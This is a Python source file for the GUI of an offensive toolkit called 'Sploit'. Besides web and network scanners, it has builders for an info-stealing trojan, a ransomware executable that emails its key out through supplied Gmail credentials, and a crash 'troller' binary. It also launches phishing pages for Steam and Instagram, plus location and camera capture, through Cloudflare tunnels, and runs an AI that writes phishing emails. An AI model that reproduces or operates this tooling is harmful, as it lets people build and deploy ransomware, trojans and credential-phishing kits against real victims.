import shutil
import customtkinter as ctk
import psutil
import requests
import sys
import threading
import subprocess
import os
import webbrowser
from Web.Basic_SQL.form_finder import find_forms
from Web.Basic_SQL.form_tester import test_form, load_sql_errors
from Web.Gain_information.Builder import SiteScanner, pretty_print
from Web.Header_Analyzer.Builder import HeaderAnalyzerBuilder
from Web.Brute_Force import Action
from Web.SSL_Chekcer.Builder import SSLCheckerBuilder
from Web.DNS_Enumeration.Builder import DNSEnumerationBuilder
from Web.Brute_Force.Elements import extract_form_fields
import Web.Find_Login_Pages.Builder as BuilderModule
from Web.Firewall_Detector.firewall_detector import FirewallDetector
from Sploit_Chatbot.Test_Code.Test import TestChatBot
import urllib3
from tkinter import filedialog, messagebox
import configparser
import re
from datetime import datetime
import time
from sklearn.metrics.pairwise import cosine_similarity
from Windows.WinSploit.build_script import build_exe
from Phishing_AI.Test import TestChatBot

if sys.platform == "win32":
    import winsound
else:
    class winsound:
        @staticmethod
        def Beep(freq, dur):
            print(f"[BEEP] {freq}Hz for {dur}ms (Linux/Mac dummy)")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
BASE_DIR1 = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")


class TextRedirector:
    def __init__(self, textbox):
        self.textbox = textbox

    def write(self, msg):
        if self.textbox.winfo_exists():
            self.textbox.after(0, self._append_text, msg)

    def _append_text(self, msg):
        if self.textbox.winfo_exists():
            self.textbox.insert("end", msg)
            self.textbox.see("end")

    def flush(self):
        pass


class ConfigManager:
    def __init__(self):
        self.config_file = os.path.join(BASE_DIR, "sploit_config.ini")
        self.config = configparser.ConfigParser()
        self.load_config()

    def load_config(self):
        if os.path.exists(self.config_file):
            self.config.read(self.config_file)
        else:
            self.create_default_config()

    def create_default_config(self):
        self.config['GENERAL'] = {
            'save_path': os.path.join(os.path.expanduser("~"), "SploitReports"),
            'thread_count': '20',
            'timeout': '10',
            'sound_notifications': 'on',
            'popup_notifications': 'on'
        }

        self.config['APPEARANCE'] = {
            'theme': 'Dark',
            'color_theme': 'Blue',
            'ui_scaling': '100'
        }

        self.config['SECURITY'] = {
            'proxy_host': '',
            'proxy_port': '',
            'request_delay': '0.5',
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }

        self.save_config()

    def save_config(self):
        with open(self.config_file, 'w') as configfile:
            self.config.write(configfile)

    def get_setting(self, section, key, default=None):
        try:
            return self.config[section][key]
        except (KeyError, configparser.NoSectionError):
            return default


class SploitApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.config = ConfigManager()

        self.title("Sploit - Pentest Toolkit")
        self.geometry("1350x1000")
        self.resizable(width=True, height=True)

        icon_path = os.path.join(BASE_DIR, "icon", "Sploitico.ico")
        if os.path.exists(icon_path):
            self.iconbitmap(icon_path)

        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self.main_container = ctk.CTkFrame(self, fg_color="transparent")
        self.main_container.grid(row=0, column=0, padx=20, pady=20, sticky="nsew")
        self.main_container.grid_columnconfigure((0, 1, 2), weight=1)
        self.main_container.grid_rowconfigure(1, weight=1)

        title_frame = ctk.CTkFrame(self.main_container, fg_color="transparent")
        title_frame.grid(row=0, column=0, columnspan=3, pady=(0, 30))

        title = ctk.CTkLabel(title_frame, text="🔐 SPLOIT PENETRATION TOOLKIT",
                             font=("Arial", 32, "bold"), text_color="#ffffff")
        title.pack(pady=10)

        subtitle = ctk.CTkLabel(title_frame, text="Comprehensive Security Testing Suite",
                                font=("Arial", 16), text_color="#b0b0b0")
        subtitle.pack()

        self.button_style = {
            "font": ("Arial", 16),
            "width": 280,
            "height": 60,
            "corner_radius": 12,
            "fg_color": "#2b2d42",
            "hover_color": "#404466",
            "text_color": "#ffffff",
            "border_width": 0
        }

        columns = [
            ctk.CTkFrame(self.main_container, fg_color="transparent"),
            ctk.CTkFrame(self.main_container, fg_color="transparent"),
            ctk.CTkFrame(self.main_container, fg_color="transparent")
        ]

        for i, col in enumerate(columns):
            col.grid(row=1, column=i, padx=10, sticky="nsew")

        web_label = ctk.CTkLabel(columns[0], text="🌐 Web Application Testing",
                                 font=("Arial", 18, "bold"), text_color="#4cc9f0")
        web_label.pack(pady=(0, 15))

        buttons_col1 = [
            ("🕸 Web Security Test (SQLi) ✅", self.web_test_window),
            ("📁 Subdirectory Finder ✅", self.subdir_window),
            ("🌐 Full Site Scan ✅", self.site_scan_window),
            ("🔑 Brute Force Simulator ✅", self.brute_force_window),
            ("👤 Admin Finder ✅", self.admin_finder_window),
            ("🕵 Deep Site Scanner ✅", self.site_scanner_window)
        ]

        for text, command in buttons_col1:
            btn = ctk.CTkButton(columns[0], text=text, command=command, **self.button_style)
            btn.pack(pady=8)

        network_label = ctk.CTkLabel(columns[1], text="🔧 Network & Infrastructure",
                                     font=("Arial", 18, "bold"), text_color="#f72585")
        network_label.pack(pady=(0, 15))

        buttons_col2 = [
            ("🔍 Port Scanner ✅" , self.scan_ports),
            ("📋 Header Analyzer ✅", self.header_analyzer),
            ("🔒 SSL/TLS Checker ✅", self.ssl_checker),
            ("🌍 DNS Enumeration ✅", self.dns_enum),
            ("🛡 Firewall Detector ✅", self.firewall_detector_window),
            ("📡 Subdomain_Enum ✅", self.subdomain_enum_window)
        ]

        for text, command in buttons_col2:
            btn = ctk.CTkButton(columns[1], text=text, command=command, **self.button_style)
            btn.pack(pady=8)

        tools_label = ctk.CTkLabel(columns[2], text="💻 Penetration Windows Toolkits",
                                   font=("Arial", 18, "bold"), text_color="#4cc9f0")
        tools_label.pack(pady=(0, 15))

        buttons_col3 = [
            ("💀 InfoStealer ( Trojan ) ✅", self.builder_window1),
            ("🔒 RDP Sec (RAT) ❌", lambda: messagebox.showwarning(
                "⚠️ Feature Temporarily Disabled",
                "RDP Security (RAT) Tool - Access Information:\n\n"
                "• This feature is currently unavailable in the GUI interface\n"
                "• Please use the command line/terminal to access this tool\n"
                "• Navigate to the tool directory and use the command line interface\n"
                "• Check documentation for CLI usage instructions\n\n"
                "Status: GUI Access Disabled - CLI Access Required"
            )),
            ("💣 RansomApp ( Encryption ) ✅", self.builder_window),
            ("🎣 PhishCapture ( Fake Pages ) ✅", self.builder_window12),
            ("🤝 PhishCreator ( AI ) ✅" , self.open_phishing_ai_chatbot),
            ("🖥 SystemTroll ( Crash ) ✅", self.build_troller_ui)
        ]

        for i, (text, command) in enumerate(buttons_col3):
            btn = ctk.CTkButton(columns[2], text=text, command=command, **self.button_style)

            if text == "🔒 RDP Sec (RAT)":
                btn.configure(
                    fg_color="#7f8c8d",
                    hover_color="#95a5a6",
                    text_color="#ecf0f1",
                    text="🔒 RDP Sec (RAT) ❌"
                )

            btn.pack(pady=8)

        windows_frame = ctk.CTkFrame(self.main_container, fg_color="transparent")
        windows_frame.grid(row=2, column=0, columnspan=3, pady=(40, 10))

        windows_label = ctk.CTkLabel(windows_frame, text="⚙️ Additional Tools",
                                     font=("Arial", 20, "bold"), text_color="#ff9e00")
        windows_label.pack(pady=(0, 15))

        windows_tools_frame = ctk.CTkFrame(self.main_container, fg_color="transparent")
        windows_tools_frame.grid(row=3, column=0, columnspan=3, pady=(0, 20))

        windows_tools = [
            ("Sploit ChatBot", self.open_chatbot),
            ("Report Issues", self.report_generator),
            ("Settings", self.settings),
            ("About US", self.open_webpage),
        ]

        row1 = ctk.CTkFrame(windows_tools_frame, fg_color="transparent")
        row1.pack(pady=5)

        row2 = ctk.CTkFrame(windows_tools_frame, fg_color="transparent")
        row2.pack(pady=5)

        for i, (text, command) in enumerate(windows_tools):
            if i < 3:
                btn = ctk.CTkButton(row1, text=text, command=command,
                                    width=180, height=50, corner_radius=10,
                                    font=("Arial", 16), fg_color="#3a3a3a",
                                    hover_color="#505050")
                btn.pack(side="left", padx=10)
            else:
                btn = ctk.CTkButton(row2, text=text, command=command,
                                    width=180, height=50, corner_radius=10,
                                    font=("Arial", 16), fg_color="#3a3a3a",
                                    hover_color="#505050")
                btn.pack(side="left", padx=10)

        footer = ctk.CTkFrame(self.main_container, fg_color="transparent")
        footer.grid(row=4, column=0, columnspan=3, pady=(40, 0))

        self.status_bar = ctk.CTkLabel(footer, text="🟢 Ready", font=("Arial", 12),
                                       text_color="#00ff00")
        self.status_bar.pack(side="left", padx=10)

        links_frame = ctk.CTkFrame(footer, fg_color="transparent")
        links_frame.pack(side="right", padx=10)

        links = [
            ("🌐 GitHub", "https://github.com/AUX-441"),
            ("📚 Docs", "https://github.com/AUX-441/Sploit/wiki"),
            ("🐛 Issues", "https://github.com/AUX-441/Sploit/issues")
        ]

        for text, url in links:
            btn = ctk.CTkButton(links_frame, text=text, font=("Arial", 14),
                                width=100, height=30, fg_color="transparent",
                                hover_color="#3a3a3a", border_width=1,
                                border_color="#555555", text_color="#ffffff",
                                command=lambda u=url: webbrowser.open(u))
            btn.pack(side="left", padx=5)



    def update_status(self, message, color="#00ff00"):
        self.status_bar.configure(text=message, text_color=color)



    def show_notification(self, title, message, is_error=False):
        if self.config.get_setting('GENERAL', 'popup_notifications') == 'on':
            if is_error:
                messagebox.showerror(title, message)
            else:
                messagebox.showinfo(title, message)

        if self.config.get_setting('GENERAL', 'sound_notifications') == 'on':
            try:
                if is_error:
                    winsound.MessageBeep(winsound.MB_ICONHAND)
                else:
                    winsound.MessageBeep(winsound.MB_ICONASTERISK)
            except:
                pass

    def open_phishing_ai_chatbot(self):
        try:
            win = ctk.CTkToplevel(self)
            win.title("PhishCreator AI ChatBot")
            win.geometry("800x600")
            win.resizable(True, True)

            win.grid_columnconfigure(0, weight=1)
            win.grid_rowconfigure(1, weight=1)

            title_label = ctk.CTkLabel(win, text="🤝 PhishCreator (AI ChatBot)",
                                       font=("Arial", 24, "bold"))
            title_label.grid(row=0, column=0, pady=15, padx=20, sticky="ew")

            chat_frame = ctk.CTkFrame(win)
            chat_frame.grid(row=1, column=0, pady=10, padx=20, sticky="nsew")
            chat_frame.grid_columnconfigure(0, weight=1)
            chat_frame.grid_rowconfigure(0, weight=1)

            response_display = ctk.CTkTextbox(chat_frame, font=("Arial", 16), wrap="word")
            response_display.grid(row=0, column=0, pady=10, padx=10, sticky="nsew")
            response_display.insert("end", "🤖 PhishCreator AI Ready!\n")
            response_display.insert("end", "💬 Example platforms: steam, instagram, omegale, location\n\n")

            scrollbar = ctk.CTkScrollbar(chat_frame, command=response_display.yview)
            scrollbar.grid(row=0, column=1, pady=10, sticky="ns")
            response_display.configure(yscrollcommand=scrollbar.set)

            input_frame = ctk.CTkFrame(win)
            input_frame.grid(row=2, column=0, pady=15, padx=20, sticky="ew")
            input_frame.grid_columnconfigure(0, weight=1)

            input_entry = ctk.CTkEntry(input_frame, placeholder_text="Enter platform...",
                                       font=("Arial", 16), height=40)
            input_entry.grid(row=0, column=0, padx=5, pady=5, sticky="ew")

            def get_answer():
                user_input = input_entry.get().strip()
                if not user_input:
                    return
                if user_input.lower() == "exit":
                    win.destroy()
                    return

                try:
                    if not hasattr(self, "phishing_ai_instance"):
                        self.phishing_ai_instance: TestChatBot = TestChatBot()
                        response_display.insert("end", "✅ PhishCreator AI model loaded successfully!\n\n")

                    email_text = self.phishing_ai_instance.generate_email(user_input)
                    response_display.insert("end", f"\n👤 You: {user_input}\n")
                    response_display.insert("end", "\n" + "─" * 50 + "\n\n")
                    response_display.insert("end", f"🤖 Bot: {email_text}\n")
                    response_display.see("end")
                    input_entry.delete(0, "end")

                except Exception as e:
                    response_display.insert("end", f"\n❌ Error: {str(e)}\n")
                    response_display.see("end")

            send_btn = ctk.CTkButton(input_frame, text="Send", width=100, height=40,
                                     command=get_answer, font=("Arial", 16, "bold"))
            send_btn.grid(row=0, column=1, padx=5, pady=5)

            input_entry.bind("<Return>", lambda event: get_answer())

            def clear_chat():
                response_display.delete("1.0", "end")
                response_display.insert("end", "💬 Chat cleared. Start new conversation...\n\n")

            clear_btn = ctk.CTkButton(win, text="Clear Chat", command=clear_chat,
                                      font=("Arial", 14), fg_color="#6c757d", hover_color="#5a6268")
            clear_btn.grid(row=3, column=0, pady=5)

            exit_btn = ctk.CTkButton(win, text="Exit", command=win.destroy,
                                     fg_color="#dc3545", hover_color="#c82333",
                                     font=("Arial", 14, "bold"), height=35)
            exit_btn.grid(row=4, column=0, pady=10)

            input_entry.focus()
            win.minsize(700, 500)

        except Exception as e:
            self.show_notification("Error", f"Failed to open PhishCreator AI Chatbot: {str(e)}", True)

    def open_webpage(self):
        webpage_path = os.path.join(BASE_DIR, "Page", "index.html")
        if os.path.exists(webpage_path):
            webbrowser.open(f"file://{webpage_path}")
        else:
            self.show_notification("Error",
                                   "Webpage not found. Please check if index.html exists in the Page directory.", True)




    def open_chatbot(self):
        try:
            win = ctk.CTkToplevel(self)
            win.title("Sploit ChatBot")
            win.geometry("800x600")
            win.resizable(True, True)

            win.grid_columnconfigure(0, weight=1)
            win.grid_rowconfigure(1, weight=1)

            title_label = ctk.CTkLabel(win, text="🔍 Sploit ChatBot",
                                       font=("Arial", 24, "bold"))
            title_label.grid(row=0, column=0, pady=15, padx=20, sticky="ew")

            chat_frame = ctk.CTkFrame(win)
            chat_frame.grid(row=1, column=0, pady=10, padx=20, sticky="nsew")
            chat_frame.grid_columnconfigure(0, weight=1)
            chat_frame.grid_rowconfigure(0, weight=1)

            response_display = ctk.CTkTextbox(chat_frame, font=("Arial", 16), wrap="word")
            response_display.grid(row=0, column=0, pady=10, padx=10, sticky="nsew")
            response_display.insert("end", "🤖 Sploit ChatBot Ready!\n")
            response_display.insert("end", "💬 Type your questions below...\n\n")

            scrollbar = ctk.CTkScrollbar(chat_frame, command=response_display.yview)
            scrollbar.grid(row=0, column=1, pady=10, sticky="ns")
            response_display.configure(yscrollcommand=scrollbar.set)

            input_frame = ctk.CTkFrame(win)
            input_frame.grid(row=2, column=0, pady=15, padx=20, sticky="ew")
            input_frame.grid_columnconfigure(0, weight=1)

            input_entry = ctk.CTkEntry(input_frame, placeholder_text="Enter your question here...",
                                       font=("Arial", 16), height=40)
            input_entry.grid(row=0, column=0, padx=5, pady=5, sticky="ew")

            def get_answer():
                user_input = input_entry.get().strip()
                if not user_input:
                    return

                if user_input.lower() == "exit":
                    win.destroy()
                    return

                try:
                    if not hasattr(self, 'chatbot_instance'):
                        self.chatbot_instance = TestChatBot()
                        response_display.insert("end", "✅ ChatBot model loaded successfully!\n\n")

                    user_input_lower = user_input.lower()
                    resub = re.sub(r"[^\w\s]", "", user_input_lower)

                    Predicted = self.chatbot_instance.model.predict([resub])[0]

                    user_vec = self.chatbot_instance.vectorizer.transform([user_input])
                    questions_vec = self.chatbot_instance.vectorizer.transform(
                        self.chatbot_instance.data["question"].values)
                    similarities = cosine_similarity(user_vec, questions_vec).flatten()
                    max_sim_idx = similarities.argmax()
                    max_sim_score = similarities[max_sim_idx]

                    if max_sim_score >= 0.7:
                        answer = self.chatbot_instance.data["answer"].iloc[max_sim_idx]
                        response = f"📚 From similar question: {answer}"
                    else:
                        response = f"bot Answer : {Predicted}"

                    response_display.insert("end", f"\n👤 You: {user_input}\n")
                    response_display.insert("end", "\n" + "─" * 50 + "\n\n")
                    response_display.insert("end", f"Sploit {response}\n")
                    response_display.see("end")

                    input_entry.delete(0, "end")

                except Exception as e:
                    response_display.insert("end", f"\n❌ Error: {str(e)}\n")
                    response_display.see("end")

            send_btn = ctk.CTkButton(input_frame, text="Send", width=100, height=40,
                                     command=get_answer, font=("Arial", 16, "bold"))
            send_btn.grid(row=0, column=1, padx=5, pady=5)

            input_entry.bind("<Return>", lambda event: get_answer())

            def clear_chat():
                response_display.delete("1.0", "end")
                response_display.insert("end", "💬 Chat cleared. Start new conversation...\n\n")

            clear_btn = ctk.CTkButton(win, text="Clear Chat", command=clear_chat,
                                      font=("Arial", 14), fg_color="#6c757d", hover_color="#5a6268")
            clear_btn.grid(row=3, column=0, pady=5)

            exit_btn = ctk.CTkButton(win, text="Exit", command=win.destroy,
                                     fg_color="#dc3545", hover_color="#c82333",
                                     font=("Arial", 14, "bold"), height=35)
            exit_btn.grid(row=4, column=0, pady=10)

            input_entry.focus()

            win.minsize(700, 500)

        except Exception as e:
            self.show_notification("Error", f"Failed to open chatbot: {str(e)}", True)

    def build_troller_ui(self):
        win = ctk.CTkToplevel(self)
        win.title("System Troller Builder")
        win.geometry("900x650")
        win.grab_set()

        title = ctk.CTkLabel(
            win,
            text="💀 System Troller (Crash & Fun App)",
            font=("Arial", 24, "bold"),
            text_color="#ff4d6d"
        )
        title.pack(pady=(20, 10))

        desc_frame = ctk.CTkFrame(win, corner_radius=12)
        desc_frame.pack(pady=10, padx=20, fill="x")

        desc_text = (
            "⚠️ This tool builds a small prank (troller) executable:\n"
            "👉  - It randomly opens programs and Explorer windows.\n"
            "👉  - Makes the system look chaotic and messy 😅\n\n"
            "👉  - This is **for fun and jokes only**.\n"
            "👉  - Do NOT use it to harm or abuse anyone! 🚫\n"
            "⚠️ You may need to restart your PC after running it locally ⚠️"
        )

        ctk.CTkLabel(
            desc_frame,
            text=desc_text,
            font=("Arial", 14),
            justify="left",
            text_color="#ffffff"
        ).pack(anchor="w", padx=15, pady=15)

        output_frame = ctk.CTkFrame(win, corner_radius=12)
        output_frame.pack(pady=10, padx=20, fill="both", expand=True)

        output_box = ctk.CTkTextbox(output_frame, width=850, height=350, font=("Consolas", 12))
        output_box.pack(side="left", fill="both", expand=True, padx=(0, 5), pady=10)

        scrollbar = ctk.CTkScrollbar(output_frame, command=output_box.yview)
        scrollbar.pack(side="right", fill="y", pady=10)
        output_box.configure(yscrollcommand=scrollbar.set)

        sys.stdout = TextRedirector(output_box)
        sys.stderr = TextRedirector(output_box)

        build_btn = ctk.CTkButton(
            win,
            text="⚙️ Build Troller",
            fg_color="#ff4d6d",
            hover_color="#ff6f91",
            text_color="white",
            font=("Arial", 16, "bold"),
            width=200,
            height=50,
            command=lambda: self.start_build_troller(win, output_box)
        )
        build_btn.pack(pady=20)

    def start_build_troller(self, parent_win, output_box):
        def run():
            try:
                project_root = os.path.dirname(BASE_DIR)
                script_path = os.path.join(project_root, "Windows", "Crashsploit", "apps.py")
                if not os.path.exists(script_path):
                    raise FileNotFoundError(f"apps.py not found at {script_path}")

                timestamp = time.strftime("%Y%m%d_%H%M%S")
                dist_folder = os.path.join(os.path.dirname(script_path), f"dist_{timestamp}")
                if os.path.exists(dist_folder):
                    shutil.rmtree(dist_folder)

                HIDDEN_IMPORTS = [
                    "win32com.client",
                ]
                EXCLUDE_MODULES = [
                    "dnspython", "whois", "scapy", "matplotlib", "colorama", "pyfiglet",
                    "customtkinter", "Flask", "pydub", "urllib3", "tqdm",
                    "scikit-learn", "pandas", "seaborn", "joblib",
                    "torch", "tensorflow", "sympy", "scipy",
                ]

                cmd = [
                    "pyinstaller",
                    "--onefile",
                    "--noconfirm",
                    "--clean",
                    "--distpath", dist_folder,
                    "--name", "Crashsploit_Troller"
                ]

                for hidden in HIDDEN_IMPORTS:
                    cmd.extend(["--hidden-import", hidden])

                for exclude in EXCLUDE_MODULES:
                    cmd.extend(["--exclude-module", exclude])

                cmd.append(script_path)

                print("[*] Running PyInstaller...")
                print(" ".join(cmd))
                subprocess.run(cmd, check=True)

                exe_path = os.path.join(dist_folder, "Crashsploit_Troller.exe")

                print(f"[+] EXE built successfully at: {exe_path}")
                messagebox.showinfo("Success", f"Troller EXE created!\nCheck '{dist_folder}' folder.")

                def open_exe_location():
                    if os.path.exists(exe_path):
                        subprocess.Popen(f'explorer /select,"{exe_path}"')
                    else:
                        messagebox.showerror("Error", "EXE file not found!")

                show_btn = ctk.CTkButton(
                    parent_win,
                    text="📂 Show EXE",
                    fg_color="#4cc9f0",
                    hover_color="#4895ef",
                    text_color="white",
                    font=("Arial", 16, "bold"),
                    width=180,
                    height=45,
                    command=open_exe_location
                )
                show_btn.pack(pady=10)

            except Exception as e:
                print(f"[!] Error: {e}")
                messagebox.showerror("Error", f"Failed to build EXE:\n{e}")

        threading.Thread(target=run, daemon=True).start()




    def builder_window(self):
        win = ctk.CTkToplevel(self)
        win.title("Python Builder")
        win.geometry("800x700")

        ctk.CTkLabel(
            win, text="⚠ Python Windows Builder ⚠",
            font=("Arial", 20, "bold"), text_color="#ff4444"
        ).pack(pady=10)

        input_frame = ctk.CTkFrame(win)
        input_frame.pack(pady=10, padx=10, fill="x")

        ctk.CTkLabel(input_frame, text="📂 Path to encrypt:").grid(row=0, column=0, sticky="w", padx=5, pady=5)
        path_entry = ctk.CTkEntry(input_frame, width=400)
        path_entry.grid(row=0, column=1, padx=5, pady=5)

        def browse_file():
            file_path = filedialog.askopenfilename()
            if file_path:
                path_entry.delete(0, "end")
                path_entry.insert(0, file_path)

        ctk.CTkButton(input_frame, text="Browse", width=80, command=browse_file).grid(row=0, column=2, padx=5, pady=5)

        send_email_var = ctk.StringVar(value="no")
        send_email_check = ctk.CTkCheckBox(input_frame, text="Send key via Email?", variable=send_email_var,
                                           onvalue="yes", offvalue="no")
        send_email_check.grid(row=1, column=0, columnspan=2, sticky="w", padx=5, pady=5)

        sender_entry = ctk.CTkEntry(input_frame, placeholder_text="Sender Gmail", width=300)
        sender_entry.grid(row=2, column=1, padx=5, pady=5)
        ctk.CTkLabel(input_frame, text="Sender Email:").grid(row=2, column=0, sticky="w")

        pass_entry = ctk.CTkEntry(input_frame, placeholder_text="App Password", width=300, show="*")
        pass_entry.grid(row=3, column=1, padx=5, pady=5)
        ctk.CTkLabel(input_frame, text="App Password:").grid(row=3, column=0, sticky="w")

        receiver_entry = ctk.CTkEntry(input_frame, placeholder_text="Receiver Email", width=300)
        receiver_entry.grid(row=4, column=1, padx=5, pady=5)
        ctk.CTkLabel(input_frame, text="Receiver Email:").grid(row=4, column=0, sticky="w")

        icon_entry = ctk.CTkEntry(input_frame, width=400)
        icon_entry.insert(0, "icons/ico.ico")
        icon_entry.grid(row=5, column=1, padx=5, pady=5)
        ctk.CTkLabel(input_frame, text="EXE Icon:").grid(row=5, column=0, sticky="w")

        output_frame = ctk.CTkFrame(win)
        output_frame.pack(pady=10, padx=10, fill="both", expand=True)

        output_box = ctk.CTkTextbox(output_frame, width=750, height=250, font=("Consolas", 12))
        output_box.pack(side="left", fill="both", expand=True)

        scrollbar = ctk.CTkScrollbar(output_frame, command=output_box.yview)
        scrollbar.pack(side="right", fill="y")
        output_box.configure(yscrollcommand=scrollbar.set)

        sys.stdout = TextRedirector(output_box)
        sys.stderr = TextRedirector(output_box)

        show_button = None

        def start_build():
            def run():
                nonlocal show_button
                try:
                    fixed_path = path_entry.get().strip()
                    send_email_choice = send_email_var.get()
                    sender_email = sender_entry.get().strip()
                    sender_pass = pass_entry.get().strip()
                    receiver_email = receiver_entry.get().strip()
                    icon_path = icon_entry.get().strip()

                    script_path = os.path.join("encryption.py")
                    if not os.path.exists(script_path):
                        raise FileNotFoundError(f"encryption.py not found at {script_path}")

                    with open(script_path, "r", encoding="utf-8") as f:
                        code = f.read()

                    code = code.replace(
                        'path = input("Enter path to encrypt: ").strip()',
                        f'path = r"{fixed_path}"'
                    ).replace(
                        'choice = input("\\nDo you want to send the key to your email? (yes/no): ").strip().lower()',
                        f'choice = "{send_email_choice}"'
                    ).replace(
                        'sender_email = input("Enter sender Gmail: ").strip()',
                        f'sender_email = "{sender_email}"'
                    ).replace(
                        'sender_pass = input("Enter sender app password: ").strip()',
                        f'sender_pass = "{sender_pass}"'
                    ).replace(
                        'receiver_email = input("Enter receiver email: ").strip()',
                        f'receiver_email = "{receiver_email}"'
                    )

                    temp_file = os.path.join("encryption_fixed.py")
                    with open(temp_file, "w", encoding="utf-8") as f:
                        f.write(code)

                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    dist_folder = os.path.join(BASE_DIR, f"dist_{timestamp}")

                    print("[*] Running PyInstaller...")
                    HIDDEN_IMPORTS = [
                        "cryptography.fernet",
                        "email.mime.text"
                    ]
                    EXCLUDE_MODULES = [
                        "dnspython", "whois", "scapy", "matplotlib", "colorama", "pyfiglet",
                        "customtkinter", "Flask", "pydub", "urllib3", "tqdm",
                        "scikit-learn", "pandas", "seaborn", "joblib",
                        "torch", "tensorflow", "sympy", "scipy","opencv-python" , "pynput" , "requests" ,
                        "pillow" , "sounddevice" , "wavio" , "numpy" , "PyAutoGUI" , "beautifulsoup4",
                        "dnspython" , "whois" , "scapy", "colorama" , "customtkinter" , "seaborn" ,
                        ""
                    ]

                    dist_folder = os.path.join(BASE_DIR, "dist_sploit")
                    if os.path.exists(dist_folder):
                        shutil.rmtree(dist_folder)

                    cmd = [
                        "pyinstaller",
                        "--onefile",
                        "--noconfirm",
                        "--clean",
                        "--distpath", dist_folder,
                        "--name", "Sploit_Encryption",
                        f"--icon={icon_path}"
                    ]

                    for hidden in HIDDEN_IMPORTS:
                        cmd.extend(["--hidden-import", hidden])

                    for exclude in EXCLUDE_MODULES:
                        cmd.extend(["--exclude-module", exclude])

                    cmd.append(temp_file)

                    print("[*] Running PyInstaller...")
                    print(" ".join(cmd))
                    subprocess.run(cmd, check=True)

                    exe_path = os.path.join(dist_folder, "Sploit_Encryption.exe")

                    if os.path.exists(exe_path):
                        print(f"[+] Build complete: {exe_path}")
                        messagebox.showinfo("Success", f"EXE built!\nCheck {dist_folder} folder.")

                        if show_button is None:
                            def open_folder():
                                os.startfile(dist_folder)

                            show_button = ctk.CTkButton(win, text="Show EXE Path", command=open_folder)
                            show_button.pack(pady=5)
                    else:
                        print("[!] EXE not found, check PyInstaller logs.")

                except Exception as e:
                    print(f"[!] Error: {e}")
                    messagebox.showerror("Error", f"Build failed:\n{e}")

            threading.Thread(target=run, daemon=True).start()

        ctk.CTkButton(win, text="⚙ CREATE EXE", command=start_build).pack(pady=10)

    def builder_window12(self):
        import tkinter as tk

        win = ctk.CTkToplevel(self)
        win.title("PhishSploit Pro")
        win.geometry("1200x800")
        win.minsize(1000, 700)

        ctk.set_appearance_mode("Dark")
        ctk.set_default_color_theme("dark-blue")

        APP_VERSION = "1.0.0"
        BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        phishsploit_dir = os.path.join(BASE_DIR, "Windows", "phishsploit")

        scripts = {
            "Steam": os.path.join(phishsploit_dir, "steam.py"),
            "Instagram": os.path.join(phishsploit_dir, "instagram.py"),
            "Location": os.path.join(phishsploit_dir, "Location.py"),
            "Camera": os.path.join(phishsploit_dir, "take_picture.py")
        }

        credentials_dirs = {
            "Steam": os.path.join(phishsploit_dir, "Steam_Credentials"),
            "Instagram": os.path.join(phishsploit_dir, "insta_Credentials"),
            "Location": os.path.join(phishsploit_dir, "location_information"),
            "Camera": os.path.join(phishsploit_dir, "uploads", "session1")
        }

        running_processes = []
        last_cloudflare_link = ""

        def run_script(script_path):
            def task():
                nonlocal last_cloudflare_link
                output_box.configure(state="normal")
                output_box.delete("1.0", "end")
                script_name = os.path.basename(script_path)
                output_box.insert("end", f"🚀 Executing {script_name}...\n", "running")
                output_box.update()

                try:
                    process = subprocess.Popen(
                        ["python", script_path],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True,
                        encoding='utf-8',
                        errors='replace',
                        creationflags=subprocess.CREATE_NEW_PROCESS_GROUP
                    )
                    running_processes.append(process)
                    cloudflare_link_shown = False

                    for line in iter(process.stdout.readline, ''):
                        output_box.insert("end", line, "output")
                        output_box.see("end")
                        output_box.update()

                        if not cloudflare_link_shown:
                            match = re.search(r"(https?://[^\s]+\.trycloudflare\.com)", line)
                            if match:
                                output_box.insert("end", f"\n🌐 Cloudflare Tunnel URL: {match.group(1)}\n\n",
                                                  "cloudflare")
                                cloudflare_link_shown = True
                                last_cloudflare_link = match.group(1)
                                copy_link_btn.configure(state="normal")

                    process.wait()
                    output_box.insert("end", f"\n✅ {script_name} executed successfully\n", "success")

                except Exception as e:
                    output_box.insert("end", f"❌ Error: {str(e)}\n", "error")

                output_box.configure(state="disabled")

            threading.Thread(target=task, daemon=True).start()

        def copy_output():
            try:
                win.clipboard_clear()
                text = output_box.get("1.0", "end")
                win.clipboard_append(text)
                status_label.configure(text="Text copied to clipboard!")
            except Exception as e:
                status_label.configure(text=f"Copy error: {str(e)}")

        def copy_cloudflare_link():
            nonlocal status_label
            if last_cloudflare_link:
                win.clipboard_clear()
                win.clipboard_append(last_cloudflare_link)
                status_label.configure(text="Cloudflare link copied to clipboard!")

        def clear_console():
            nonlocal last_cloudflare_link
            output_box.configure(state="normal")
            output_box.delete("1.0", "end")
            output_box.configure(state="disabled")
            status_label.configure(text="Console cleared")
            copy_link_btn.configure(state="disabled")
            last_cloudflare_link = ""

        def kill_all_processes():
            nonlocal running_processes
            for proc in running_processes:
                try:
                    parent = psutil.Process(proc.pid)
                    for child in parent.children(recursive=True):
                        child.terminate()
                    parent.terminate()
                except:
                    pass
            running_processes = []
            output_box.configure(state="normal")
            output_box.insert("end", "\n🛑 All running processes have been terminated.\n", "error")
            output_box.configure(state="disabled")
            status_label.configure(text="All processes terminated!")
            copy_link_btn.configure(state="disabled")

        def open_credentials(script_name):
            try:
                folder_path = credentials_dirs.get(script_name)
                if folder_path:
                    os.makedirs(folder_path, exist_ok=True)
                    os.startfile(folder_path)
                    status_label.configure(text=f"Opened {script_name} credentials folder!")
                else:
                    status_label.configure(text="Folder not defined!")
            except Exception as e:
                status_label.configure(text=f"Error opening folder: {str(e)}")

        def on_closing():
            kill_all_processes()
            win.destroy()

        title_font = ctk.CTkFont(family="Segoe UI", size=24, weight="bold")
        header_font = ctk.CTkFont(family="Segoe UI", size=18, weight="bold")
        normal_font = ctk.CTkFont(family="Segoe UI", size=14)
